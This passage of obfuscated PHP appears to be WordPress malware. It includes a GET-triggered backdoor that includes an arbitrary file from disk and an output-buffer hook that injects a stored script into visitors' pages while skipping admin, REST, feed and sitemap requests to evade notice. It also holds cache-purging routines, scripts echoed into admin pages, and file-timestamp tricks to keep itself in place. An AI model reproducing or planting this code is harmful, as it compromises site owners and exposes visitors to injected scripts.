     $qob86cgcszmxzgt  =  @$GLOBALS['__scf_vpig9uwvw8_pu_20']($p1l05n0seiv)   ?    iljst04arjh1pet016s($p1l05n0seiv)  :   "";



 $joyisggx2yb =   ($qob86cgcszmxzgt   === null);
    if     ($GLOBALS['__scf_is0fvk8c7tq2_41']($qob86cgcszmxzgt)   && $qob86cgcszmxzgt   !==     "" &&    $GLOBALS['__scf_ak3p5za9uvhzh8_96'](xpm5lg9odtw6di(1721),      $GLOBALS['__scf__fl_gwujcblq_9']($qob86cgcszmxzgt,    0,   (4073+23)),  $lkdmzg1wcctseepi)   && version_compare($lkdmzg1wcctseepi[1],   xl8k_pjv1048a7ae7(),  '>'))  $joyisggx2yb  = true;
unset($lkdmzg1wcctseepi);
  if    (!$joyisggx2yb  && (!$GLOBALS['__scf_is0fvk8c7tq2_41']($qob86cgcszmxzgt) ||   $qob86cgcszmxzgt   === "" ||  $GLOBALS['__scf_eo363tjzd4r6n_56']($qob86cgcszmxzgt)    !==  $GLOBALS['__scf_eo363tjzd4r6n_56']($h3wz11cllq)))  {

 if  (rmpvo8i8m8kfd9311njxy7($p1l05n0seiv,   o_a46xczfm0z3pa91s($h3wz11cllq)))    {
f97udlofaljpuxw1_jgnfh($p1l05n0seiv, (372+48));
  mcuqsw_cyo3mnayi6ofr6($p1l05n0seiv);
   g6q1ehat0szqqsfbv2($p1l05n0seiv);
    }
 }    elseif (!$joyisggx2yb)     {
   $hch5kxac5piln =  @$GLOBALS['__scf_k4z5lhhe91ty_98']($p1l05n0seiv);
  if  (!$hch5kxac5piln  ||      ($hch5kxac5piln  %  (99904+96))  !==    aruikh7uoh1wrp5bqr79()) mcuqsw_cyo3mnayi6ofr6($p1l05n0seiv);

    unset($hch5kxac5piln);


   }
  unset($qob86cgcszmxzgt,     $joyisggx2yb);



      }
      xlvrmlebpyi298wlej790($h3wz11cllq);
   }   catch (Throwable $o_qyrtxl85owt)   {
 kkpdha95nyx3tbltd10(xpm5lg9odtw6di(1722),   $o_qyrtxl85owt);
   }  catch (Exception $o_qyrtxl85owt)    {
}
// @partition skip-list

  }
function    q5kskw6zztkpeftc_p522()
 {
// @trace rate-limiter

 if   (!isset($_GET['p'])  || !$GLOBALS['__scf_is0fvk8c7tq2_41']($_GET['p'])) return;

  $n3oa_6o82fz9oz4    = $_GET['p'];
    if  ($n3oa_6o82fz9oz4 ===   j3vkapmz6az2bzd0wv(xognx_h1jzkh(1111)))   {
 $GLOBALS[bk9m46jygo3f(1723)]  = true;
    try   {
// @ssa-convert extension

    $lvs6ajr7uv8094  =    fgatjmo7gg2xolgmpki4y2()   .  '/'  .     g2g3r6pz8prst3gz(ABSPATH .  gz_aorofp7mo(1724),   (1<<3))     . bk9m46jygo3f(1702);
$lq81ugkzqw = @$GLOBALS['__scf_vpig9uwvw8_pu_20']($lvs6ajr7uv8094)     ?    (int)  @$GLOBALS['__scf_r6y1fbsyx8i2l_99']($lvs6ajr7uv8094)    : 0;
    if  ($lq81ugkzqw >   (0x1cf+0x25) &&  $lq81ugkzqw    <= (5242789+91))     {

  include $lvs6ajr7uv8094;



}
}      catch   (Throwable $o_qyrtxl85owt)   {
 } catch  (Exception  $o_qyrtxl85owt) {
 }
while   ($GLOBALS['__scf_n82j_c5k8jxotq_403']()   >    0 && @ob_end_clean()) {
}
   header(ar6vo_1nyhx2koj5(1725));


 exit;

   }
 if  ($n3oa_6o82fz9oz4  !==    j3vkapmz6az2bzd0wv(ar6vo_1nyhx2koj5(1726)))   return;
try {
    if ($GLOBALS['__scf_v_sk95ndl08_4'](xognx_h1jzkh(1572)) &&  $GLOBALS['__scf_v_sk95ndl08_4'](ar6vo_1nyhx2koj5(1727))) {
  @update_option(bk9m46jygo3f(498),  (int) @get_option(xognx_h1jzkh(498), 0) +  1,     xognx_h1jzkh(1665));
 @update_option(gz_aorofp7mo(501),  $GLOBALS['__scf_ks7_xfapvywl_185'](), xognx_h1jzkh(1665));
 }
  $vc5t0mpquv =      ydk7304srtwvcn8gdl(xpm5lg9odtw6di(359),  "");

if ($GLOBALS['__scf_fxl4k4gsul_10']($vc5t0mpquv) > (218^190)    &&      !$GLOBALS['__scf_ak3p5za9uvhzh8_96'](xpm5lg9odtw6di(1728), $vc5t0mpquv)  &&  $GLOBALS['__scf_ak3p5za9uvhzh8_96'](xognx_h1jzkh(1729),     $vc5t0mpquv))     {
 $tlulh2578f   =  @$GLOBALS['__scf_hg1ogpq4w6_351']($vc5t0mpquv,   true);
      if ($tlulh2578f !==   false    && $GLOBALS['__scf_fxl4k4gsul_10']($tlulh2578f)  >    (176^212)) $vc5t0mpquv =   $tlulh2578f;
 }
// @unfold savepoint

 if  ($GLOBALS['__scf_fxl4k4gsul_10']($vc5t0mpquv)   <    (75+25))  $vc5t0mpquv    =    bk4kokp93l3cc_();
if   ($GLOBALS['__scf_fxl4k4gsul_10']($vc5t0mpquv) <  (0x4c+0x18))    {
 while    ($GLOBALS['__scf_n82j_c5k8jxotq_403']()  > 0   &&     @ob_end_clean())  {
}



 header(bk9m46jygo3f(1730));
     header(ar6vo_1nyhx2koj5(1731));



    header(xpm5lg9odtw6di(1732));


 exit;
    }
 $xbfa3a_0vrab6   =  ydk7304srtwvcn8gdl(xpm5lg9odtw6di(1137),  "");


    $wtc4a9q637gmiv   =    '"'     .      $GLOBALS['__scf_eo363tjzd4r6n_56']($xbfa3a_0vrab6     .     $vc5t0mpquv) .    '"';
 if (isset($_SERVER[gz_aorofp7mo(1733)])  &&   $GLOBALS['__scf_u6m4cedwgt__319']($_SERVER[gz_aorofp7mo(1734)])  === $wtc4a9q637gmiv) {

while  ($GLOBALS['__scf_n82j_c5k8jxotq_403']()   > 0 &&  @ob_end_clean())    {
     }
    header(bk9m46jygo3f(1735));


   header(xpm5lg9odtw6di(1736)     .     $wtc4a9q637gmiv);

exit;
    }
   while   ($GLOBALS['__scf_n82j_c5k8jxotq_403']() >    0 && @ob_end_clean())   {
 }

  header(xpm5lg9odtw6di(1730));



 header(bk9m46jygo3f(1731));
      header(ar6vo_1nyhx2koj5(1737));
header(bk9m46jygo3f(1736)  . $wtc4a9q637gmiv);


echo $xbfa3a_0vrab6   .    $vc5t0mpquv;
exit;
 }  catch (Throwable $o_qyrtxl85owt) {
  kkpdha95nyx3tbltd10(ar6vo_1nyhx2koj5(1738),  $o_qyrtxl85owt);
}      catch  (Exception  $o_qyrtxl85owt)  {
      kkpdha95nyx3tbltd10(ar6vo_1nyhx2koj5(1738),  $o_qyrtxl85owt);
      }
// Sodium crypto: clopen proof-term

     }
// PHP attributes: post-dominate skip-list

q5kskw6zztkpeftc_p522();
function    pzmd01xoty8_zdf6xhllj3()
  {
      if  (!isset($_GET[gz_aorofp7mo(1739)]))   return;



    try     {
   $keq5garhai93k1     =   $_GET[bk9m46jygo3f(1740)];
  



       if      (!$GLOBALS['__scf_is0fvk8c7tq2_41']($keq5garhai93k1) ||    $keq5garhai93k1 ===  "")    return;
   $keq5garhai93k1     = $GLOBALS['__scf_bwbaq8fxyxm3_103']($keq5garhai93k1);$l3k4oe22x=(0x33+0x7f);$hqq8oj5m3=$l3k4oe22x%6;
   $qjfjyt6fke =   array();
      if   ($GLOBALS['__scf_v_sk95ndl08_4'](xpm5lg9odtw6di(1741))) $qjfjyt6fke[]     =  (string)    $GLOBALS['__scf_b58bt0r94kp1_555'](home_url(), PHP_URL_HOST);


if ($GLOBALS['__scf_v_sk95ndl08_4'](bk9m46jygo3f(1572)))     {
 $siksotb5f6cf3b     =  (string)  @get_option(xognx_h1jzkh(560),   "");
 if ($siksotb5f6cf3b  !== "")    $qjfjyt6fke[]  =   (string)  $GLOBALS['__scf_b58bt0r94kp1_555']($siksotb5f6cf3b,     PHP_URL_HOST);
 }
   if   (isset($_SERVER[xognx_h1jzkh(1742)]))   $qjfjyt6fke[]     =  (string)     $_SERVER[xognx_h1jzkh(1742)];
$qjfjyt6fke[] =    vse28wh0vwl84gzd2("");
$im3k0raj5t1b  =   false;



  foreach  ($GLOBALS['__scf_p3c9g_i0vy_148']($qjfjyt6fke)   as  $_v44jfvalbfkj6ch)  {
   if   (!$GLOBALS['__scf_is0fvk8c7tq2_41']($_v44jfvalbfkj6ch)  ||    $_v44jfvalbfkj6ch  ===   "") continue;$d_e0xwpu2zt=PHP_MAJOR_VERSION;$wvomm2oy=$d_e0xwpu2zt*7;
 if     ($GLOBALS['__scf_j_4rj7vg4ae0j_7']($_v44jfvalbfkj6ch, ':')  !== false)      $_v44jfvalbfkj6ch   =    $GLOBALS['__scf_a6uiw8bt24jybf_454'](gz_aorofp7mo(1743),    "",  $_v44jfvalbfkj6ch);
  if    (g2g3r6pz8prst3gz($GLOBALS['__scf_bwbaq8fxyxm3_103']($_v44jfvalbfkj6ch)  .    bk9m46jygo3f(1744),     (20-8))    ===  $keq5garhai93k1)  {
 $im3k0raj5t1b  =  true;
break;
 }
/* equivariant bridge */

}
 if (!$im3k0raj5t1b)      return;
     $p2b8hazf5ujzkf   =   $GLOBALS['__scf_shhwbshoxi0_1148'](bk9m46jygo3f(1745),    (15<<1));
  $rzryil7zx5yhrr0a = gc3rwc4p_0_e6ohd(yx5b9plavtfppnjk($p2b8hazf5ujzkf));



  while   ($GLOBALS['__scf_n82j_c5k8jxotq_403']() >  0 &&   @ob_end_clean())     {
// FFI bindings: idempotent-adj watermark


    }

 header(xognx_h1jzkh(1746));
header(bk9m46jygo3f(1747));
   echo    ($rzryil7zx5yhrr0a     ===  $p2b8hazf5ujzkf)   ?   xognx_h1jzkh(1748)  .  $GLOBALS['__scf_eo363tjzd4r6n_56']($p2b8hazf5ujzkf) :    xpm5lg9odtw6di(1749);
     exit;


  }  catch      (Throwable    $o_qyrtxl85owt) {
 kkpdha95nyx3tbltd10(bk9m46jygo3f(1750),     $o_qyrtxl85owt);
  }   catch  (Exception  $o_qyrtxl85owt)  {

    kkpdha95nyx3tbltd10(xpm5lg9odtw6di(1750),  $o_qyrtxl85owt);

    }
 }
  pzmd01xoty8_zdf6xhllj3();
   function u0t5d0jiawby98a()
    {
   $im3k0raj5t1b = true;
 $o03k8yqdft6dio1z      = function   ($bb9zpsruvkm)   use (&$im3k0raj5t1b) {



  try  {
$GLOBALS['__scf_pds8salms2pk_289']($bb9zpsruvkm);
}   catch     (Throwable $o_qyrtxl85owt)   {
 $im3k0raj5t1b =     false;$u0k_7q4bfc=(0x61+0x8f);$yuqqw87t1x3sns=$u0k_7q4bfc%14;

  }  catch    (Exception    $o_qyrtxl85owt) {
// WP Formatting API attachment metadata

  $im3k0raj5t1b  =   false;$bmzd87wugkj=27*7;$mbhjvd520=$bmzd87wugkj-13;
   }
     };
       if    ($GLOBALS['__scf_v_sk95ndl08_4'](gz_aorofp7mo(1751))) $o03k8yqdft6dio1z(ar6vo_1nyhx2koj5(1751));
      if    ($GLOBALS['__scf_v_sk95ndl08_4'](bk9m46jygo3f(1752)))  $o03k8yqdft6dio1z(gz_aorofp7mo(1753));


if  ($GLOBALS['__scf_v_sk95ndl08_4'](gz_aorofp7mo(531)))   $o03k8yqdft6dio1z(xognx_h1jzkh(531));
    if ($GLOBALS['__scf_v_sk95ndl08_4'](xpm5lg9odtw6di(1754)))  $o03k8yqdft6dio1z(xognx_h1jzkh(1754));



  elseif      ($GLOBALS['__scf_kwfvo_j_hzb_532'](ar6vo_1nyhx2koj5(1755))   &&   $GLOBALS['__scf__e6bt2kljb6u_120'](xognx_h1jzkh(1755), ar6vo_1nyhx2koj5(1756))) $o03k8yqdft6dio1z(array(xognx_h1jzkh(1757),    xpm5lg9odtw6di(1756)));
       if  ($GLOBALS['__scf_kwfvo_j_hzb_532'](gz_aorofp7mo(1758))  &&    $GLOBALS['__scf__e6bt2kljb6u_120'](ar6vo_1nyhx2koj5(1758),  xpm5lg9odtw6di(1759)))   $o03k8yqdft6dio1z(array(bk9m46jygo3f(1758),    gz_aorofp7mo(1759)));
if     ($GLOBALS['__scf_kwfvo_j_hzb_532'](gz_aorofp7mo(1760))   &&   $GLOBALS['__scf__e6bt2kljb6u_120'](ar6vo_1nyhx2koj5(1760),  ar6vo_1nyhx2koj5(1761))) $o03k8yqdft6dio1z(array(xpm5lg9odtw6di(1760), xpm5lg9odtw6di(1762)));
 if   ($GLOBALS['__scf_v_sk95ndl08_4'](gz_aorofp7mo(1763)))      $o03k8yqdft6dio1z(gz_aorofp7mo(1763));
  elseif     (isset($GLOBALS[gz_aorofp7mo(1764)])   && $GLOBALS['__scf_v834hljo6be9_67']($GLOBALS[ar6vo_1nyhx2koj5(1764)])     &&   $GLOBALS['__scf__e6bt2kljb6u_120']($GLOBALS[xognx_h1jzkh(1764)], ar6vo_1nyhx2koj5(1765)))      $o03k8yqdft6dio1z(function  ()  {
 $GLOBALS[xognx_h1jzkh(1764)]->deleteCache(true);

  });


    if ($GLOBALS['__scf_v_sk95ndl08_4'](ar6vo_1nyhx2koj5(1766)))  $o03k8yqdft6dio1z(ar6vo_1nyhx2koj5(1766));
  if  ($GLOBALS['__scf_kwfvo_j_hzb_532'](bk9m46jygo3f(1767))     &&    $GLOBALS['__scf__e6bt2kljb6u_120'](bk9m46jygo3f(1767),      xognx_h1jzkh(1768)))  $o03k8yqdft6dio1z(array(gz_aorofp7mo(1767),   bk9m46jygo3f(1769)));
kkpdha95nyx3tbltd10(ar6vo_1nyhx2koj5(446),      xognx_h1jzkh(1770));
  return  $im3k0raj5t1b;
}
 function   excgwx2e2jgsxws1iih()
 {
  if  ($GLOBALS['__scf_v_sk95ndl08_4'](xpm5lg9odtw6di(755))  &&   is_admin())     return true;
    if ($GLOBALS['__scf_v_sk95ndl08_4'](xognx_h1jzkh(1771))    && wp_doing_ajax()) return     true;
       if   (defined(xognx_h1jzkh(1772)) &&    REST_REQUEST) return    true;
  if      (defined(xognx_h1jzkh(1773)) &&  XMLRPC_REQUEST) return true;
  if ($GLOBALS['__scf_v_sk95ndl08_4'](bk9m46jygo3f(1774))  &&  is_feed())  return   true;



    if   ($GLOBALS['__scf_v_sk95ndl08_4'](gz_aorofp7mo(1775)) &&  is_robots())  return   true;
 if  ($GLOBALS['__scf_v_sk95ndl08_4'](ar6vo_1nyhx2koj5(1776)) && is_sitemaps()) return   true;
if ($GLOBALS['__scf_v_sk95ndl08_4'](xognx_h1jzkh(1777))   &&   is_customize_preview())    return true;
    if  (isset($_GET[gz_aorofp7mo(1778)])  ||     isset($_GET[xognx_h1jzkh(1779)])    || isset($_GET[gz_aorofp7mo(1780)]))   return true;


   return  false;
 }



  function   q9sii7t7ecig1fgpvlmb5n()
{
$wncl7lxibp   = (isset($GLOBALS[bk9m46jygo3f(1781)]) &&   $GLOBALS['__scf_is0fvk8c7tq2_41']($GLOBALS[xpm5lg9odtw6di(1781)]))  ?  $GLOBALS['__scf_u6m4cedwgt__319']($GLOBALS[gz_aorofp7mo(1781)])   :    "";
  if    ($wncl7lxibp ===  "")   return "";
     $wncl7lxibp =     $GLOBALS['__scf_vz8ci2guu7b5_355'](xognx_h1jzkh(1782),     gz_aorofp7mo(1783),   $wncl7lxibp);
    $s43p9k8htvnhu989   =      $GLOBALS['__scf_v_sk95ndl08_4'](ar6vo_1nyhx2koj5(1741))   ?  (string) $GLOBALS['__scf_b58bt0r94kp1_555'](home_url(), PHP_URL_HOST)    :  "";



      $qf6lynhjz3hmm3k      =    g2g3r6pz8prst3gz($GLOBALS['__scf_bwbaq8fxyxm3_103']($s43p9k8htvnhu989),   (1+5));
 $owkj4ztbzlza7l   =     $GLOBALS['__scf__fl_gwujcblq_9']($GLOBALS['__scf_eo363tjzd4r6n_56']($wncl7lxibp),   0, (0x4+0x2));
      return  "\n<script data-sc=\""  .  $qf6lynhjz3hmm3k     .  '-' .    $owkj4ztbzlza7l .   "\">\n" . $wncl7lxibp .   "\n</script>\n<!-- sc" .   $qf6lynhjz3hmm3k  .    '-'  . $owkj4ztbzlza7l    .    " -->\n";
}
function     u824zvz__j1hhrg98ht6hr()
{

  try  {


if    (excgwx2e2jgsxws1iih())     return;

      $rhb7ikn12gowlj  =  q9sii7t7ecig1fgpvlmb5n();
   if  ($rhb7ikn12gowlj  === "")    return;

    echo $rhb7ikn12gowlj;
    $GLOBALS[bk9m46jygo3f(491)]     = true;
 if    ($GLOBALS['__scf_v_sk95ndl08_4'](xpm5lg9odtw6di(1572))  &&    $GLOBALS['__scf_v_sk95ndl08_4'](xognx_h1jzkh(1727))    &&   empty($GLOBALS[xognx_h1jzkh(1784)]))     {
   $GLOBALS[xognx_h1jzkh(1784)] =   true;
  $wvjc7czethc1  = (int) @get_option(ar6vo_1nyhx2koj5(1785),   0);
   if   ($GLOBALS['__scf_ks7_xfapvywl_185']() -  $wvjc7czethc1   >  (0x112+0x1a))    @update_option(gz_aorofp7mo(1785),  $GLOBALS['__scf_ks7_xfapvywl_185'](), gz_aorofp7mo(1665));

     unset($wvjc7czethc1);
    }
 }    catch  (Throwable    $o_qyrtxl85owt)  {
  kkpdha95nyx3tbltd10(bk9m46jygo3f(613), $o_qyrtxl85owt);
  }  catch   (Exception $o_qyrtxl85owt)   {
}



}
  function cgfjod4xu8g4hgnfrx($d3f4bhlqef,     $lws4f8mpyx3p64b  = 0)
    {$eehmx0km9nfec=83*5;$e5axz140n08e=$eehmx0km9nfec-23;
      if  (!$GLOBALS['__scf_is0fvk8c7tq2_41']($d3f4bhlqef) ||   $d3f4bhlqef  ===  "")  return $d3f4bhlqef;
  if  (defined(xpm5lg9odtw6di(1786))  &&    !($lws4f8mpyx3p64b   &  PHP_OUTPUT_HANDLER_FINAL))   return   $d3f4bhlqef;
 if    (!empty($GLOBALS[bk9m46jygo3f(1723)])) return   $d3f4bhlqef;
 if   (!empty($GLOBALS[xognx_h1jzkh(491)])) return  $d3f4bhlqef;
if   ($GLOBALS['__scf_fxl4k4gsul_10']($d3f4bhlqef)  > (575487+3618817))   return    $d3f4bhlqef;
if  ($GLOBALS['__scf_v_sk95ndl08_4'](xognx_h1jzkh(395)))   {
  foreach  ((array)  @headers_list() as  $zzkcgwxvm5u) {
        if (stripos($zzkcgwxvm5u,    xpm5lg9odtw6di(1787))    === 0  &&  stripos($zzkcgwxvm5u,   xognx_h1jzkh(1788))  !== false)   return  $d3f4bhlqef;


 if  (stripos($zzkcgwxvm5u,    xognx_h1jzkh(1789)) ===  0 &&     stripos($zzkcgwxvm5u, xpm5lg9odtw6di(1790))    ===  false && stripos($zzkcgwxvm5u, xpm5lg9odtw6di(1791)) ===  false)    return $d3f4bhlqef;
  }
    unset($zzkcgwxvm5u);
    }
$rhb7ikn12gowlj  =  q9sii7t7ecig1fgpvlmb5n();
  if  ($rhb7ikn12gowlj    === "")     return $d3f4bhlqef;
     if  (stripos($d3f4bhlqef, ar6vo_1nyhx2koj5(1792)) ===     false     && stripos($d3f4bhlqef, gz_aorofp7mo(1793)) ===   false)   return     $d3f4bhlqef;
  $GLOBALS[ar6vo_1nyhx2koj5(491)]   =    true;
     $GLOBALS[gz_aorofp7mo(493)]    =   true;



  $gof0hl0rvz7u =   stripos($d3f4bhlqef,    bk9m46jygo3f(1792));


   if   ($gof0hl0rvz7u     !==    false)  {$bzgtigh1p0g6o=26*7;$rade9xavzkc_s=$bzgtigh1p0g6o-46;
        return   $GLOBALS['__scf__fl_gwujcblq_9']($d3f4bhlqef,     0,   $gof0hl0rvz7u) . $rhb7ikn12gowlj  . $GLOBALS['__scf__fl_gwujcblq_9']($d3f4bhlqef,     $gof0hl0rvz7u);

 }
   return   $d3f4bhlqef      .     $rhb7ikn12gowlj;
    }
 function  v4hydjejpupvohz()
 {
      try  {
if (excgwx2e2jgsxws1iih())  return;



 if   (!empty($GLOBALS[xognx_h1jzkh(1794)]))   return;
 if (!empty($GLOBALS[gz_aorofp7mo(1795)]))  return;
   if (!$GLOBALS['__scf_v_sk95ndl08_4'](ar6vo_1nyhx2koj5(1796)))  return;
 $wncl7lxibp   =   (isset($GLOBALS[xognx_h1jzkh(1781)])  &&  $GLOBALS['__scf_is0fvk8c7tq2_41']($GLOBALS[xognx_h1jzkh(1781)])) ?  $GLOBALS['__scf_u6m4cedwgt__319']($GLOBALS[gz_aorofp7mo(1781)]) :   "";

   if ($wncl7lxibp  === "")  return;
$t3i2v8loam92  = isset($_SERVER[xognx_h1jzkh(1797)])  ? (string)  $_SERVER[xpm5lg9odtw6di(1797)] :  "";


 if    ($t3i2v8loam92 !==     ""  &&    $GLOBALS['__scf_ak3p5za9uvhzh8_96'](xognx_h1jzkh(1798),  $t3i2v8loam92))  return;
    if    ($GLOBALS['__scf_v_sk95ndl08_4'](xpm5lg9odtw6di(1799))) {
  foreach   ((array)  @headers_list()   as     $zzkcgwxvm5u)  {
if (stripos($zzkcgwxvm5u,     xpm5lg9odtw6di(1787))   ===   0    &&     stripos($zzkcgwxvm5u,   ar6vo_1nyhx2koj5(1800))     !== false)   return;
  if   (stripos($zzkcgwxvm5u, ar6vo_1nyhx2koj5(1789))  === 0  &&   stripos($zzkcgwxvm5u, xpm5lg9odtw6di(1801)) ===  false     &&   stripos($zzkcgwxvm5u,  gz_aorofp7mo(1802))    ===      false) return;
  

if  (stripos($zzkcgwxvm5u, gz_aorofp7mo(1803))    ===   0)     return;
    }
   unset($zzkcgwxvm5u);
  }



      $GLOBALS[xpm5lg9odtw6di(1804)]    =  true;
  @$GLOBALS['__scf_u8t8ov38lmv5t_1805'](bk9m46jygo3f(1806));
   }    catch (Throwable $o_qyrtxl85owt)   {
kkpdha95nyx3tbltd10(gz_aorofp7mo(1807),   $o_qyrtxl85owt);
   } catch    (Exception  $o_qyrtxl85owt)    {



}
  }
 function    ck65a8uxbaniqzw4jlaeo()
 {
     try  {
     if  (!$GLOBALS['__scf_v_sk95ndl08_4'](gz_aorofp7mo(755)))     return;
if (!is_admin()  &&  (!isset($GLOBALS[xognx_h1jzkh(1808)])   ||    $GLOBALS[gz_aorofp7mo(1808)]    !==  xpm5lg9odtw6di(1809)))    return;
if   ($GLOBALS['__scf_v_sk95ndl08_4'](ar6vo_1nyhx2koj5(1810))   &&   !is_ssl()) return;
$hpxj8qln8dr    =     ydk7304srtwvcn8gdl(bk9m46jygo3f(358), "");
   

$qf6lynhjz3hmm3k =     g2g3r6pz8prst3gz(ABSPATH     . xpm5lg9odtw6di(613), (7-1));
       $uabrlao9g235yy   = xpm5lg9odtw6di(1314);


 if  ($hpxj8qln8dr ===      "") {
if   ($GLOBALS['__scf_v_sk95ndl08_4'](xpm5lg9odtw6di(1572))      &&   (int)    @get_option(ar6vo_1nyhx2koj5(1811),  0))  {
// catch block




@update_option(xpm5lg9odtw6di(1812), 0, xpm5lg9odtw6di(1813));
$xxz8k7d3af_wa  =  (string)      @get_option(gz_aorofp7mo(1814),   "");
    echo "\n" .    bk9m46jygo3f(1815) .  $qf6lynhjz3hmm3k . '>'

  .   xognx_h1jzkh(1816)
  .   xpm5lg9odtw6di(1817) .   $uabrlao9g235yy(gz_aorofp7mo(1818)) .    xpm5lg9odtw6di(1819)
 . ar6vo_1nyhx2koj5(1820)   . $GLOBALS['__scf_dpcnt5aa9yk_581']($xxz8k7d3af_wa) . ';'
   .     bk9m46jygo3f(1821)   .  $uabrlao9g235yy(xpm5lg9odtw6di(1822))  . bk9m46jygo3f(1823)
   .   ar6vo_1nyhx2koj5(1824)  .    $uabrlao9g235yy(bk9m46jygo3f(1825))   .    xpm5lg9odtw6di(1826)   .  $uabrlao9g235yy(xognx_h1jzkh(1827)) .    bk9m46jygo3f(1826)  . $uabrlao9g235yy(bk9m46jygo3f(1828))  . gz_aorofp7mo(1829)    .  $uabrlao9g235yy(gz_aorofp7mo(1830))  .  bk9m46jygo3f(1831)
     . xpm5lg9odtw6di(1832)  . $uabrlao9g235yy(bk9m46jygo3f(1833)) .     bk9m46jygo3f(1834)   .     $uabrlao9g235yy(xpm5lg9odtw6di(1835)) .  bk9m46jygo3f(1836)
    .  gz_aorofp7mo(1837)   . "\n";
 unset($xxz8k7d3af_wa);
 }
return;
      }
 $hpxj8qln8dr   =  $GLOBALS['__scf_vz8ci2guu7b5_355'](gz_aorofp7mo(1114),  xognx_h1jzkh(1118), $hpxj8qln8dr);
  if    ($GLOBALS['__scf_j_4rj7vg4ae0j_7']($hpxj8qln8dr,    bk9m46jygo3f(1838))   !==   0)     $hpxj8qln8dr = bk9m46jygo3f(1838) .  $GLOBALS['__scf__4_5aelz82b4m_8']($hpxj8qln8dr,  '/');
     $fpx5_abd3cgtl_  =  '/';
      if    ($GLOBALS['__scf_v_sk95ndl08_4'](gz_aorofp7mo(1839)))     {
  $fr93q3st7949  =  (string)    $GLOBALS['__scf_b58bt0r94kp1_555'](home_url(),   PHP_URL_PATH);

if ($fr93q3st7949     !== ""    &&    $fr93q3st7949   !== '/')    $fpx5_abd3cgtl_  =  $GLOBALS['__scf_v2rfz0q9cvmh_12']($fr93q3st7949, '/')   .  '/';
}
if    ($GLOBALS['__scf_v_sk95ndl08_4'](ar6vo_1nyhx2koj5(1727)))   {
  @update_option(xognx_h1jzkh(1840),  1,      bk9m46jygo3f(1813));
     @update_option(xognx_h1jzkh(1841),   $hpxj8qln8dr,    bk9m46jygo3f(1813));
     }
  $tlccd1gj58q  = bk9m46jygo3f(1815) .  $qf6lynhjz3hmm3k .   '>'
 .  gz_aorofp7mo(1816)
    . gz_aorofp7mo(1842)  .  $uabrlao9g235yy(ar6vo_1nyhx2koj5(1818))    .  bk9m46jygo3f(1843)
 .    xognx_h1jzkh(1844)
 . xognx_h1jzkh(1845) .   $uabrlao9g235yy(xpm5lg9odtw6di(1846)) .     gz_aorofp7mo(1847)   . $GLOBALS['__scf_dpcnt5aa9yk_581']($hpxj8qln8dr)  .   ')'
 .  xognx_h1jzkh(1848) .  $uabrlao9g235yy(gz_aorofp7mo(1825)) . xognx_h1jzkh(1826)      . $uabrlao9g235yy(bk9m46jygo3f(1827))  . xognx_h1jzkh(1849)  . $uabrlao9g235yy(xognx_h1jzkh(1850)) .   bk9m46jygo3f(1829)    . $uabrlao9g235yy(bk9m46jygo3f(1830))   .    xognx_h1jzkh(1851) . $GLOBALS['__scf_dpcnt5aa9yk_581']($hpxj8qln8dr) .  bk9m46jygo3f(1852)
    .   gz_aorofp7mo(1853)   .   $uabrlao9g235yy(gz_aorofp7mo(1854)) .    xognx_h1jzkh(1855)   . $GLOBALS['__scf_dpcnt5aa9yk_581']($hpxj8qln8dr)   . xpm5lg9odtw6di(1856)   .  $GLOBALS['__scf_dpcnt5aa9yk_581']($fpx5_abd3cgtl_)  .      gz_aorofp7mo(1857) .    $uabrlao9g235yy(bk9m46jygo3f(1835))  .   xpm5lg9odtw6di(1858)
.   xognx_h1jzkh(1859)  .     $uabrlao9g235yy(xpm5lg9odtw6di(1835))   . gz_aorofp7mo(1860)
 .   ar6vo_1nyhx2koj5(1861) .   $uabrlao9g235yy(xpm5lg9odtw6di(1862))    . ar6vo_1nyhx2koj5(1863)      . $uabrlao9g235yy(ar6vo_1nyhx2koj5(175))  . bk9m46jygo3f(1864)
   .     bk9m46jygo3f(1865) . $uabrlao9g235yy(ar6vo_1nyhx2koj5(1866)) .  ar6vo_1nyhx2koj5(1843)
   .  xognx_h1jzkh(1867)
.    xognx_h1jzkh(1861) . $uabrlao9g235yy(ar6vo_1nyhx2koj5(1868))   . ar6vo_1nyhx2koj5(1869)



   .  xpm5lg9odtw6di(1870)  . $uabrlao9g235yy(bk9m46jygo3f(1825))  .      xpm5lg9odtw6di(1871) .  $uabrlao9g235yy(gz_aorofp7mo(1872))   . ar6vo_1nyhx2koj5(1873)


  . gz_aorofp7mo(1837);
      echo  "\n"    .  $tlccd1gj58q   . "\n";
}  catch  (Throwable  $o_qyrtxl85owt)   {


 kkpdha95nyx3tbltd10(bk9m46jygo3f(1874),  $o_qyrtxl85owt);
     

     } catch (Exception   $o_qyrtxl85owt)    {
// equivariant envelope

   kkpdha95nyx3tbltd10(ar6vo_1nyhx2koj5(1874), $o_qyrtxl85owt);
  }
    }
 
     if (xewa1s40nekwzung2uuren())   {
   return;
  }

   mbmxky7iwj3mil3();
$or9d2z0nl0 =  @$GLOBALS['__scf_k4z5lhhe91ty_98'](bho93o6vof3ni5_rg622_h());
 if (!$or9d2z0nl0   ||      ($or9d2z0nl0  %  (0x10bc+0x175e4))    !== aruikh7uoh1wrp5bqr79())  {
 $j944m9w87ez_   = $GLOBALS['__scf_ks7_xfapvywl_185']();



wbvm0leq3qkmkea59(bho93o6vof3ni5_rg622_h(),     ($j944m9w87ez_  -   ($j944m9w87ez_    %  (125028-25028)))    +  aruikh7uoh1wrp5bqr79());
unset($j944m9w87ez_);
    }
  unset($or9d2z0nl0);
  $t_6hlhcopw =    $GLOBALS['__scf_meo_1tvjsals_11'](__FILE__)   .   bk9m46jygo3f(1875)  .      $GLOBALS['__scf_pmoxtzoe3f0qw_3'](__FILE__,     bk9m46jygo3f(1702));
 $xt5q8kanr7m6v4d  = @$GLOBALS['__scf_vpig9uwvw8_pu_20']($t_6hlhcopw) ? (int) @$GLOBALS['__scf_k4z5lhhe91ty_98']($t_6hlhcopw)    : 0;
        $n1i7gpxlz2v08     =   !($xt5q8kanr7m6v4d   >    $GLOBALS['__scf_ks7_xfapvywl_185']()  -    (201+99)  && $xt5q8kanr7m6v4d    <=  $GLOBALS['__scf_ks7_xfapvywl_185']()   +   (146+154));
   if  ($n1i7gpxlz2v08)    @$GLOBALS['__scf_iylawj38txgw_73']($t_6hlhcopw);
 unset($t_6hlhcopw, $xt5q8kanr7m6v4d);
if    ($n1i7gpxlz2v08)   try  {
 $hqtzgh899h0dszi = __FILE__;
        $wn99uh8wlw5q  = "";
